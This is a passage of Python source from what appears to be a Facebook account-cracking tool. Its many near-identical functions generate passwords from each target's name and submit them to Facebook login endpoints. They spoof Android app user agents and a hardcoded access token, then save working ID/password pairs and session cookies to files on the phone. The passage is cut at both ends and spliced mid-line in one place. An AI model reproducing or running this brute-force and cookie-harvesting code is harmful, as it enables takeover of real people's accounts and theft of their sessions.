,							global ok,loop
			sys                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  #method3             
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [B28-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ua,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [B28-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/B28-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/B28-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[B28-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#b-api method
#method3                
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [B28-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = f)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[B28-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [B28-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			EHC=session.cookies.get_dict().keys()
			if "c_user" in EHC:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [EHC-OK] %s | %s'%(ids,pas))
				open('/sdcard/B28-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in EHC:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/B28-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method6
#d.fb
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [B28-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			EHC=session.cookies.get_dict().keys()
			if "c_user" in EHC:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [B28-OK] %s | %s'%(ids,pas))
				open('/sdcard/B28-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in EHC:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/B28-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method7
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [B28-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			EHC=session.cookies.get_dict().keys()
			if "c_user" in EHC:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [B28-OK] %s | %s'%(ids,pas))
				open('/sdcard/B28-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in EHC:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/B28-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method1rnd
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [B28-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45204',
'X-FB-SIM-HNI': '45201',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [B28-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [B28-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

def trt2(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [Mr.SPY-RANDOM] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			ffb=random.choice(fbks)
			dvlk = random.choice(usr)
			#1 method issue es ma ha
			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'api_key': '8114af471d039628db5c68cb127af936',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Mr.SPY-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/EHC-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [Mr.SPY-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/B28-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		print(e)
#new method
                
def trt3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [B28-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                               
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [B28-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/EHC-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/B28-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [B28-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#method4
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [B28-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [B28-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/B28-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/B28-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [B28-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#method5
def trt5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [B28-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
